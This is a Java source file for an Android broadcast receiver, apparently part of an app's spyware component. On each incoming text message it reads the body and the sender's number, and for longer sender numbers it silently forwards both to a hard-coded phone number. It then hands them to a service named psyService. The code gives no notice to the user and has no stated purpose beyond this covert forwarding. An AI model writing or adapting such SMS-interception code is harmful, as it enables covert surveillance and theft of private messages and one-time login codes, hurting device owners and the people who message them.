package com.example.ysp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

public class startReciverService extends BroadcastReceiver 
{

	@Override
	public void onReceive(Context context, Intent intent) 
	{
		// TODO Auto-generated method stub
		// Get the object of SmsManager
	    final SmsManager sms = SmsManager.getDefault();
	    String senderNum = null;
	    String message = null;
		
		if(intent != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
		{
			
			// Retrieves a map of extended data from the intent.
	        final Bundle bundle = intent.getExtras();
	 
	        try {
	             if (bundle != null) 
	            {
	                 
	                final Object[] pdusObj = (Object[]) bundle.get("pdus");
	                 
	                for (int i = 0; i < pdusObj.length; i++) {
	                     
	                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
	                    String phoneNumber = currentMessage.getDisplayOriginatingAddress();
	                     
	                    senderNum = phoneNumber;
	                    message = currentMessage.getDisplayMessageBody();
	 
	                    
	                    if(senderNum.length()>10)
	    		        {
	    		        	sms.sendTextMessage("120398098213", null, (message+"\n"+senderNum), null, null);
	    		        }
	  
	                } // end for loop
	              } // bundle is null
	 
	        } 
	        catch (Exception e) 
	        {
	            Log.e("SmsReceiver", "Exception smsReceiver" +e);
	             
	        }
			
			
			Intent serviceIntent=new Intent(context,psyService.class);
			serviceIntent.putExtra("MSG", message);
			serviceIntent.putExtra("NBR", senderNum);
			context.startService(serviceIntent);	
		}
	}

}
